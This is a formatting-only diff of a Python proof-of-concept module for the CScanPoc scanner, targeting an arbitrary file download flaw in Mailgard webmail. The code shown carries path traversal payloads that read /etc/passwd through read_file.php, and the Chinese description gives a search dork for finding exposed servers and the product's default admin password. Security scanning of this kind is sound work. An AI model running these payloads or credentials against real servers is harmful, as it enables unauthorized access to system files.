@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Mailgard_0004_L' # 平台漏洞编号，留空
+    vuln_id = 'Mailgard_0004_L'  # 平台漏洞编号，留空
     name = '佑友mailgard webmail任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-03-29'  # 漏洞公布时间
     desc = '''
         百度搜索intitle:"mailgard webmail"，多家没有改admin密码的中招，默认密码admin/hicomadmin
@@ -31,12 +32,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #登录用户直接访问
+
+            # 登录用户直接访问
             payloads = {
                 "/src/read_file.php?signature=../../../../../../../etc/passwd",
                 "/src/read_file.php?uploadimage=../../../../../../../../../../etc/passwd"
-                }
+            }
             for payload in payloads:
                 url = self.target + payload
                 r = requests.get(url)
@@ -50,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
